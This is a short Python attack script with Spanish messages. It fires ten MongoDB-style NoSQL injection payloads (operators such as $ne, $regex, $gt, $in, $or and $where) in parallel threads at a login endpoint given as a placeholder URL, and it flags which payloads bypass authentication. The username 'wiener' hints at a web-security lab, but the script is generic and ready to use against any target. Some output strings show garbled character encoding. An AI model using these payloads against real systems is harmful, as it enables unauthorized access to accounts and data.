import requests
import json
import threading

def nosql_injection_test(url, payload):
    headers = {'Content-Type': 'application/json'}

    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        if response.status_code == 200:
            print(f"[+] Inyecci贸n exitosa con payload: {payload}")
            print(f"[+] Respuesta: {response.text}")
        else:
            print(f"[-] Inyecci贸n fallida con payload: {payload}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error en la solicitud: {e}")

def main():
    target_url = "<URL>"

    # Lista de payloads para probar
    payloads = [
        { "username": "wiener", "password": {"$ne" : ""} },
        { "username": {"$regex":"admin.*"}, "password": { "$ne": "" } },
        { "username": { "$ne": "foo" }, "password": { "$ne": "bar" } },
        { "username": {"$gt":""}, "password": {"$gt":""} },
        { "username": {"$in": ["Admin", "4dm1n", "admin", "root", "administrator"]}, "password": {"$gt": ""} },
        { "username": { "$regex": ".*" }, "password": { "$regex": ".*" } },
        { "username": { "$in": [] }, "password": { "$in": [] } },
        { "$or": [ { "username": "admin" }, { "username": { "$ne": "admin" } } ] },
        { "username": { "$ne": 1 }, "password": { "$ne": 1 } },
        { "username": { "$where": "this.password.length > 0" }, "password": "" }
    ]

    print("[*] Iniciando pruebas de inyecci贸n NoSQL...")

    threads = []
    for payload in payloads:
        thread = threading.Thread(target=nosql_injection_test, args=(target_url, payload))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("[*] Pruebas de inyecci贸n NoSQL completadas.")

if __name__ == "__main__":
    main()
